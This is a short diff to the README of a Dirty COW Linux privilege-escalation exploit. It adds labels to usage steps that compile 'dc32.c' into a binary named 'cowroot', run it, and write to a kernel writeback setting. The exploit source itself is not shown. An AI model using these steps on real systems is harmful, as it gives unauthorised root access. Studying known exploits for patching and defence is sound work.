@@ -3,7 +3,9 @@ Dirtycow exploit for both 32 and 64-bit
 
 # Usage Example For 32 Bit
 
+Compile -o = Output
 * $ gcc dc32.c -o cowroot -pthread
+Run
 * $ ./cowroot
 * $ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
 
